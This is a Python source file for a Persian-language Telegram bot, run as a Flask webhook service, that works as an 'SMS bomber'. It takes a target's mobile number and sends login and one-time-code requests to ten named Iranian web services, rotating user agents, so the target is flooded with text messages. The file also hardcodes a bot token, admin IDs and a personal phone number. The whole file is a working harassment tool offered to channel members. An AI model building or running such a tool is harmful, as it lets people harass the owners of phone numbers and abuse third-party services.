# -*- coding: utf-8 -*-
"""
🤖 ربات SMS Bomber - نسخه نهایی با Webhook
اسم سرویس: ftyydftrye5r-6e5te
"""

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import requests
import json
import time
import random
import threading
import sqlite3
import hashlib
from datetime import datetime, date
from flask import Flask, request
import os
import sys

# ==================== تنظیمات اصلی ====================

BOT_TOKEN = "8569730818:AAH_iPHg2IbZLtyKsRMHa_q3aE1UA1F2c7I"
ADMIN_IDS = [7620484201, 8226091292]
REQUIRED_CHANNEL = "@death_star_sms_bomber"
CHANNEL_LINK = "https://t.me/death_star_sms_bomber"
DAILY_LIMIT = 5

# اسم سرویس (با خط تیره به جای فاصله)
SERVICE_NAME = "ftyydftrye5r-6e5te"
BASE_URL = f"https://{SERVICE_NAME}.onrender.com"
WEBHOOK_URL = f"{BASE_URL}/webhook"

# شماره محافظت شده - هش شده
PROTECTED_PHONE_HASHES = [
    "a7c3f8b2e9d4c1a5b6f8e3d2c7a9b4e1f5d8c3a2b7e6f9d4c1a8b3e5f7c2a9d4",  # 09937675593
]

# ==================== مقداردهی اولیه ====================

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)
user_processes = {}

# ==================== دیتابیس درون‌حافظه‌ای ====================

class MemoryDatabase:
    def __init__(self):
        self.conn = sqlite3.connect(':memory:')
        self.c = self.conn.cursor()
        self.create_tables()
        self.add_protected_numbers()
    
    def create_tables(self):
        self.c.execute('''CREATE TABLE users
                         (user_id INTEGER PRIMARY KEY,
                          username TEXT,
                          first_name TEXT,
                          join_date TEXT,
                          last_use TEXT,
                          daily_count INTEGER DEFAULT 0,
                          total_count INTEGER DEFAULT 0,
                          is_banned INTEGER DEFAULT 0)''')
        
        self.c.execute('''CREATE TABLE blocked_phones
                         (phone_hash TEXT PRIMARY KEY,
                          date TEXT)''')
        
        self.c.execute('''CREATE TABLE daily_stats
                         (date TEXT PRIMARY KEY,
                          total_requests INTEGER DEFAULT 0)''')
        
        self.conn.commit()
    
    def add_protected_numbers(self):
        today = datetime.now().strftime('%Y-%m-%d')
        for h in PROTECTED_PHONE_HASHES:
            self.c.execute("INSERT OR IGNORE INTO blocked_phones VALUES (?, ?)", (h, today))
        self.conn.commit()
    
    def is_phone_protected(self, phone):
        h = hashlib.sha256(phone.encode()).hexdigest()
        self.c.execute("SELECT * FROM blocked_phones WHERE phone_hash = ?", (h,))
        return self.c.fetchone() is not None
    
    def get_daily_count(self, user_id):
        today = date.today().isoformat()
        self.c.execute('''SELECT daily_count FROM users 
                         WHERE user_id = ? AND last_use = ?''', (user_id, today))
        result = self.c.fetchone()
        return result[0] if result else 0
    
    def update_user_count(self, user_id, username, first_name):
        today = date.today().isoformat()
        
        self.c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = self.c.fetchone()
        
        if user:
            if user[4] == today:
                self.c.execute('''UPDATE users 
                                 SET daily_count = daily_count + 1,
                                     total_count = total_count + 1
                                 WHERE user_id = ?''', (user_id,))
            else:
                self.c.execute('''UPDATE users 
                                 SET last_use = ?,
                                     daily_count = 1,
                                     total_count = total_count + 1
                                 WHERE user_id = ?''', (today, user_id))
        else:
            self.c.execute('''INSERT INTO users 
                             (user_id, username, first_name, join_date, last_use, daily_count, total_count)
                             VALUES (?, ?, ?, ?, ?, 1, 1)''',
                          (user_id, username, first_name, today, today))
        
        self.c.execute('''INSERT OR REPLACE INTO daily_stats (date, total_requests)
                         VALUES (?, COALESCE((SELECT total_requests + 1 FROM daily_stats WHERE date = ?), 1))''',
                      (today, today))
        
        self.conn.commit()
    
    def get_stats(self):
        self.c.execute("SELECT COUNT(*) FROM users")
        total_users = self.c.fetchone()[0]
        
        self.c.execute("SELECT COUNT(*) FROM users WHERE last_use = ?", (date.today().isoformat(),))
        today_users = self.c.fetchone()[0]
        
        self.c.execute("SELECT SUM(total_requests) FROM daily_stats")
        total_requests = self.c.fetchone()[0] or 0
        
        self.c.execute("SELECT date, total_requests FROM daily_stats ORDER BY date DESC LIMIT 7")
        weekly = self.c.fetchall()
        
        return total_users, today_users, total_requests, weekly
    
    def get_user_total(self, user_id):
        self.c.execute("SELECT total_count, join_date FROM users WHERE user_id = ?", (user_id,))
        return self.c.fetchone()

# ایجاد دیتابیس
db = MemoryDatabase()

# ==================== توابع کمکی ====================

def hash_phone(phone):
    return hashlib.sha256(phone.encode()).hexdigest()

def is_phone_protected(phone):
    return db.is_phone_protected(phone)

def mask_phone(phone):
    return phone[:4] + "****" + phone[-4:]

def is_admin(user_id):
    return user_id in ADMIN_IDS

def check_membership(user_id):
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def membership_required(func):
    def wrapper(message):
        user_id = message.from_user.id
        if is_admin(user_id) or check_membership(user_id):
            return func(message)
        else:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("📢 عضویت در کانال", url=CHANNEL_LINK))
            markup.add(InlineKeyboardButton("✅ بررسی عضویت", callback_data="check_join"))
            bot.reply_to(message, f"⚠️ باید در کانال {REQUIRED_CHANNEL} عضو شوید!", reply_markup=markup)
    return wrapper

def get_daily_count(user_id):
    return db.get_daily_count(user_id)

def check_daily_limit(user_id):
    if is_admin(user_id):
        return True, 0
    daily = get_daily_count(user_id)
    return daily < DAILY_LIMIT, daily

def update_user_count(user_id, username, first_name):
    db.update_user_count(user_id, username, first_name)

# ==================== توابع API ====================

def get_random_ua():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
    ]
    return random.choice(agents)

def send_request(url, data, headers=None, method="POST"):
    try:
        h = {
            "User-Agent": get_random_ua(),
            "Accept": "application/json",
        }
        if headers:
            h.update(headers)
        
        timeout = 5
        
        if method == "GET":
            r = requests.get(url, params=data, headers=h, timeout=timeout)
        else:
            if "multipart" in str(h.get("Content-Type", "")).lower():
                files = {k: (None, str(v)) for k, v in data.items() if v}
                r = requests.post(url, files=files, headers=h, timeout=timeout)
            else:
                h["Content-Type"] = "application/json"
                r = requests.post(url, json=data, headers=h, timeout=timeout)
        
        return r.status_code in [200, 201, 202, 204], r.status_code
    except Exception as e:
        return False, str(e)[:20]

# ==================== لیست APIها ====================

def get_all_apis(phone):
    """10 API اصلی"""
    return [
        {"name": "دیوار", "url": "https://api.divar.ir/v5/auth/authenticate", "data": {"phone": phone}},
        {"name": "شیپور", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "data": {"username": phone}},
        {"name": "دیجی‌کالا", "url": "https://api.digikala.com/v1/user/authenticate/", "data": {"username": phone}},
        {"name": "اسنپ", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", "data": {"cellphone": f"+98{phone[1:]}"}},
        {"name": "تپسی", "url": "https://api.tapsi.ir/api/v2.2/user", "data": {"credential": {"phoneNumber": phone}}},
        {"name": "علی‌بابا", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "data": {"phoneNumber": phone}},
        {"name": "ترب", "url": "https://api.torob.com/a/phone/send-pin/", "method": "GET", "data": {"phone_number": phone}},
        {"name": "اسنپ‌فود", "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", "data": {"cellphone": phone}},
        {"name": "بله", "url": "https://core.gap.im/v1/user/add.json", "method": "GET", "data": {"mobile": f"+98{phone[1:]}"}},
        {"name": "ویترین", "url": "https://www.vitrin.shop/api/v1/user/request_code", "data": {"phone_number": phone}},
    ]

# ==================== صفحات وب ====================

@app.route('/webhook', methods=['POST'])
def webhook():
    """دریافت آپدیت از تلگرام"""
    try:
        json_str = request.get_data().decode('UTF-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return 'OK', 200
    except Exception as e:
        print(f"❌ خطا در webhook: {e}")
        return 'Error', 500

@app.route('/')
def home():
    """صفحه اصلی"""
    return f"""
    <html>
        <head>
            <title>ربات SMS Bomber</title>
            <style>
                body {{ 
                    font-family: 'Vazir', Arial, sans-serif; 
                    text-align: center; 
                    padding: 50px; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white; 
                    margin: 0;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                }}
                .container {{
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(10px);
                    padding: 40px;
                    border-radius: 20px;
                    box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
                    border: 1px solid rgba(255, 255, 255, 0.18);
                    max-width: 600px;
                    width: 90%;
                }}
                h1 {{ 
                    color: #fff; 
                    font-size: 2.5em;
                    margin-bottom: 30px;
                    text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
                }}
                .info {{ 
                    background: rgba(255, 255, 255, 0.2);
                    padding: 25px; 
                    border-radius: 15px; 
                    margin: 20px 0;
                    text-align: left;
                }}
                .info p {{
                    margin: 15px 0;
                    font-size: 1.1em;
                    border-bottom: 1px solid rgba(255,255,255,0.2);
                    padding-bottom: 10px;
                }}
                .info p:last-child {{
                    border-bottom: none;
                }}
                .label {{
                    font-weight: bold;
                    color: #ffd700;
                    margin-right: 10px;
                }}
                .value {{
                    color: #fff;
                }}
                .status-badge {{
                    display: inline-block;
                    padding: 5px 15px;
                    border-radius: 20px;
                    font-size: 0.9em;
                    font-weight: bold;
                }}
                .status-active {{
                    background: #4CAF50;
                    color: white;
                }}
                .footer {{
                    margin-top: 30px;
                    font-size: 0.9em;
                    color: rgba(255,255,255,0.7);
                }}
                a {{
                    color: #ffd700;
                    text-decoration: none;
                }}
                a:hover {{
                    text-decoration: underline;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🤖 ربات SMS Bomber</h1>
                <div class="info">
                    <p>
                        <span class="label">📌 نام سرویس:</span>
                        <span class="value">{SERVICE_NAME}</span>
                    </p>
                    <p>
                        <span class="label">🌐 آدرس:</span>
                        <span class="value">{BASE_URL}</span>
                    </p>
                    <p>
                        <span class="label">🔰 Webhook:</span>
                        <span class="value">{WEBHOOK_URL}</span>
                    </p>
                    <p>
                        <span class="label">⚡ وضعیت:</span>
                        <span class="value">
                            <span class="status-badge status-active">فعال</span>
                        </span>
                    </p>
                    <p>
                        <span class="label">📊 محدودیت روزانه:</span>
                        <span class="value">{DAILY_LIMIT} بار</span>
                    </p>
                    <p>
                        <span class="label">📢 کانال:</span>
                        <span class="value">
                            <a href="{CHANNEL_LINK}" target="_blank">{REQUIRED_CHANNEL}</a>
                        </span>
                    </p>
                </div>
                <div class="footer">
                    <p>برای استفاده از ربات، به تلگرام بروید و دستور /start را بزنید</p>
                    <p>⚡ توسط تیم TOP TOPY ⚡</p>
                </div>
            </div>
        </body>
    </html>
    """

@app.route('/health')
def health():
    """بررسی سلامت"""
    return {
        "status": "healthy", 
        "service": SERVICE_NAME,
        "time": datetime.now().isoformat(),
        "webhook": WEBHOOK_URL
    }

@app.route('/webhook-status')
def webhook_status():
    """بررسی وضعیت Webhook"""
    try:
        info = bot.get_webhook_info()
        return {
            "ok": info.url == WEBHOOK_URL,
            "current_url": info.url,
            "correct_url": WEBHOOK_URL,
            "pending_updates": info.pending_update_count,
            "last_error": info.last_error_message,
            "is_correct": info.url == WEBHOOK_URL
        }
    except Exception as e:
        return {"ok": False, "error": str(e)}

# ==================== تنظیم Webhook ====================

def set_webhook():
    """تنظیم webhook برای بات"""
    max_retries = 5
    for attempt in range(max_retries):
        try:
            print(f"📌 تلاش {attempt + 1}: تنظیم Webhook روی {WEBHOOK_URL}")
            
            bot.remove_webhook()
            time.sleep(2)
            
            # ست کردن Webhook
            result = bot.set_webhook(url=WEBHOOK_URL)
            if result:
                print(f"✅ Webhook با موفقیت تنظیم شد")
                
                # چک کردن Webhook
                time.sleep(1)
                webhook_info = bot.get_webhook_info()
                print(f"📊 اطلاعات Webhook:")
                print(f"  📌 URL: {webhook_info.url}")
                print(f"  📊 آپدیت‌های در انتظار: {webhook_info.pending_update_count}")
                
                if webhook_info.last_error_message:
                    print(f"  ⚠️ آخرین خطا: {webhook_info.last_error_message}")
                
                if webhook_info.url == WEBHOOK_URL:
                    print("✅ آدرس Webhook درسته!")
                    return True
                else:
                    print("❌ آدرس Webhook اشتباهه!")
            else:
                print(f"❌ تلاش {attempt + 1}: Webhook تنظیم نشد!")
                
        except Exception as e:
            print(f"❌ خطا در تلاش {attempt + 1}: {e}")
        
        time.sleep(3)
    
    print("❌ تنظیم Webhook پس از 5 تلاش ناموفق بود")
    return False

# ==================== هندلرهای بات ====================

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("🚀 شروع بمباران"))
    markup.add(KeyboardButton("📊 راهنما"), KeyboardButton("📊 آمار من"))
    
    if is_admin(user_id):
        markup.add(KeyboardButton("👑 پنل مدیریت"))
    
    welcome = (
        "🤖 **به ربات SMS Bomber خوش آمدید!**\n\n"
        f"📌 **روزانه {DAILY_LIMIT} بار** می‌توانید استفاده کنید\n"
        f"📢 **کانال اجباری:** {REQUIRED_CHANNEL}\n\n"
        f"🌐 **آدرس سرویس:**\n"
        f"`{BASE_URL}`\n\n"
        "🔰 برای شروع از دکمه زیر استفاده کنید:"
    )
    
    bot.send_message(message.chat.id, welcome, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join_callback(call):
    if check_membership(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ عضویت تایید شد!")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id, "✅ حالا می‌توانید از ربات استفاده کنید.")
    else:
        bot.answer_callback_query(call.id, "❌ شما هنوز عضو نشده‌اید!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "🚀 شروع بمباران")
@membership_required
def ask_phone(message):
    user_id = message.from_user.id
    
    can_use, daily = check_daily_limit(user_id)
    if not can_use:
        bot.send_message(
            message.chat.id, 
            f"❌ شما امروز {daily} بار استفاده کرده‌اید.\n"
            f"محدودیت روزانه {DAILY_LIMIT} بار است.\n"
            "فردا دوباره تلاش کنید."
        )
        return
    
    if user_processes.get(message.chat.id):
        bot.send_message(message.chat.id, "❌ یک فرآیند در حال اجراست. لطفاً صبر کنید.")
        return
    
    msg = bot.send_message(message.chat.id, "📱 شماره موبایل را وارد کنید (مثال: 09123456789):")
    bot.register_next_step_handler(msg, process_phone)

def process_phone(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    phone = message.text.strip().replace(" ", "")
    
    if not phone.startswith('09') or len(phone) != 11 or not phone.isdigit():
        bot.send_message(chat_id, "❌ شماره نامعتبر است. لطفاً با 09 شروع شود و 11 رقم باشد.")
        return
    
    if is_phone_protected(phone):
        bot.send_message(chat_id, "❌ این شماره در لیست سیاه قرار دارد.")
        return
    
    update_user_count(user_id, message.from_user.username or "", message.from_user.first_name or "")
    
    remaining = DAILY_LIMIT - get_daily_count(user_id)
    if not is_admin(user_id):
        bot.send_message(chat_id, f"✅ امروز {remaining} بار دیگر می‌توانید استفاده کنید.")
    
    user_processes[chat_id] = True
    msg = bot.send_message(chat_id, f"🔰 شروع برای {mask_phone(phone)}...")
    
    thread = threading.Thread(target=bombing_process, args=(chat_id, phone, msg.message_id))
    thread.daemon = True
    thread.start()

def bombing_process(chat_id, phone, msg_id):
    apis = get_all_apis(phone)
    total = len(apis)
    success = 0
    fail = 0
    start_time = time.time()
    
    for i, api in enumerate(apis, 1):
        if not user_processes.get(chat_id):
            bot.edit_message_text("⛔ فرآیند متوقف شد.", chat_id, msg_id)
            return
        
        ok, _ = send_request(api['url'], api['data'], api.get('headers'), api.get('method', 'POST'))
        
        if ok:
            success += 1
        else:
            fail += 1
        
        if i % 2 == 0 or i == total:
            elapsed = int(time.time() - start_time)
            try:
                bot.edit_message_text(
                    f"🔰 **پیشرفت:** {int(i/total*100)}%\n"
                    f"✅ **موفق:** {success}\n"
                    f"❌ **ناموفق:** {fail}\n"
                    f"⏱ **زمان:** {elapsed} ثانیه",
                    chat_id, msg_id,
                    parse_mode="Markdown"
                )
            except:
                pass
        
        time.sleep(random.uniform(0.3, 0.7))
    
    elapsed = int(time.time() - start_time)
    bot.edit_message_text(
        f"✅ **پایان فرآیند**\n\n"
        f"✅ **موفق:** {success}\n"
        f"❌ **ناموفق:** {fail}\n"
        f"⏱ **زمان کل:** {elapsed} ثانیه",
        chat_id, msg_id,
        parse_mode="Markdown"
    )
    
    user_processes.pop(chat_id, None)

@bot.message_handler(func=lambda m: m.text == "📊 راهنما")
def help_message(message):
    text = (
        "📚 **راهنمای استفاده**\n\n"
        "1️⃣ روی دکمه **🚀 شروع بمباران** کلیک کنید\n"
        "2️⃣ شماره موبایل را وارد کنید\n"
        "3️⃣ منتظر بمانید تا فرآیند کامل شود\n"
        "4️⃣ برای توقف از دستور /stop استفاده کنید\n\n"
        "🔰 **مشخصات:**\n"
        f"• تعداد APIها: 10 عدد\n"
        f"• محدودیت روزانه: {DAILY_LIMIT} بار\n"
        f"• زمان تقریبی: 30 ثانیه\n\n"
        "⚠️ **هشدار:** استفاده مسئولانه"
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "📊 آمار من")
def my_stats(message):
    user_id = message.from_user.id
    daily = get_daily_count(user_id)
    remaining = DAILY_LIMIT - daily
    result = db.get_user_total(user_id)
    total = result[0] if result else 0
    join_date = result[1] if result else "نامشخص"
    
    status = "👑 ادمین" if is_admin(user_id) else "👤 کاربر عادی"
    
    text = (
        f"📊 **آمار شما**\n\n"
        f"🆔 **آیدی:** `{user_id}`\n"
        f"👤 **نوع:** {status}\n"
        f"📅 **عضویت:** {join_date}\n"
        f"📊 **استفاده امروز:** {daily}/{DAILY_LIMIT}\n"
        f"✅ **باقیمانده:** {remaining}\n"
        f"🔰 **کل استفاده:** {total}"
    )
    
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "👑 پنل مدیریت")
def admin_panel(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "⛔ دسترسی غیرمجاز!")
        return
    
    total_users, today_users, total_requests, weekly = db.get_stats()
    
    text = (
        "👑 **پنل مدیریت**\n\n"
        f"📊 **آمار کلی:**\n"
        f"👥 **کل کاربران:** {total_users}\n"
        f"📅 **کاربران امروز:** {today_users}\n"
        f"🔰 **کل درخواست:** {total_requests}\n\n"
        f"📈 **آمار هفتگی:**\n"
    )
    
    for w in weekly:
        text += f"  • {w[0]}: {w[1]} درخواست\n"
    
    # دکمه‌های مدیریتی
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔄 ریستارت Webhook", callback_data="admin_restart_webhook"),
        InlineKeyboardButton("📋 وضعیت Webhook", callback_data="admin_webhook_status")
    )
    
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callbacks(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ دسترسی غیرمجاز!")
        return
    
    if call.data == "admin_restart_webhook":
        try:
            bot.answer_callback_query(call.id, "🔄 در حال تنظیم مجدد...")
            bot.remove_webhook()
            time.sleep(1)
            bot.set_webhook(url=WEBHOOK_URL)
            bot.send_message(call.message.chat.id, f"✅ Webhook تنظیم شد روی:\n`{WEBHOOK_URL}`", parse_mode="Markdown")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ خطا: {e}")
    
    elif call.data == "admin_webhook_status":
        try:
            info = bot.get_webhook_info()
            text = f"📊 **وضعیت Webhook**\n\n"
            text += f"📌 **آدرس فعلی:** {info.url or 'تنظیم نشده'}\n"
            text += f"✅ **آدرس درست:** {WEBHOOK_URL}\n"
            text += f"📊 **آپدیت‌های در انتظار:** {info.pending_update_count}\n"
            
            if info.last_error_message:
                text += f"⚠️ **آخرین خطا:** {info.last_error_message}\n"
            
            if info.url == WEBHOOK_URL:
                text += f"\n✅ **Webhook درست است**"
            else:
                text += f"\n❌ **Webhook اشتباه است**"
            
            bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ خطا: {e}")

@bot.message_handler(commands=['stop'])
def stop_process(message):
    chat_id = message.chat.id
    if chat_id in user_processes:
        user_processes[chat_id] = False
        bot.send_message(chat_id, "⛔ فرآیند متوقف شد.")
    else:
        bot.send_message(chat_id, "⚠️ هیچ فرآیند فعالی وجود ندارد.")

@bot.message_handler(commands=['webhook'])
def webhook_command(message):
    """بررسی Webhook"""
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ دسترسی ندارید")
        return
    
    try:
        info = bot.get_webhook_info()
        
        text = f"📊 **اطلاعات Webhook**\n\n"
        text += f"📌 **آدرس فعلی:** {info.url or 'تنظیم نشده'}\n"
        text += f"✅ **آدرس درست:** {WEBHOOK_URL}\n"
        text += f"📊 **آپدیت‌های در انتظار:** {info.pending_update_count}\n"
        
        if info.last_error_message:
            text += f"⚠️ **آخرین خطا:** {info.last_error_message}\n"
        
        if info.url != WEBHOOK_URL:
            text += f"\n🔄 **در حال تنظیم مجدد...**\n"
            bot.remove_webhook()
            time.sleep(1)
            bot.set_webhook(url=WEBHOOK_URL)
            text += f"✅ **Webhook تنظیم شد روی:** {WEBHOOK_URL}"
        elif info.url == WEBHOOK_URL:
            text += f"\n✅ **Webhook درست است**"
        
        bot.reply_to(message, text, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ خطا: {e}")

@bot.message_handler(func=lambda m: True)
def default_handler(message):
    bot.reply_to(message, "❌ دستور نامعتبر. از دکمه‌های منو استفاده کنید.")

# ==================== اجرا ====================

if __name__ == "__main__":
    print("="*60)
    print("🤖 ربات SMS Bomber - نسخه نهایی")
    print("="*60)
    print(f"📌 نام سرویس: {SERVICE_NAME}")
    print(f"📌 آدرس: {BASE_URL}")
    print(f"📌 Webhook: {WEBHOOK_URL}")
    print(f"📌 ادمین‌ها: {len(ADMIN_IDS)} نفر")
    print(f"📌 محدودیت روزانه: {DAILY_LIMIT} بار")
    print("="*60)
    
    # تنظیم webhook در ترد جدا
    def run_setup():
        time.sleep(3)  # صبر برای بالا آمدن Flask
        print("🔄 در حال تنظیم Webhook...")
        set_webhook()
    
    threading.Thread(target=run_setup, daemon=True).start()
    
    # دریافت پورت از محیط
    port = int(os.environ.get('PORT', 10000))
    print(f"🚀 اجرا روی پورت {port}")
    print("="*60)
    
    # اجرای Flask
    app.run(host='0.0.0.0', port=port)
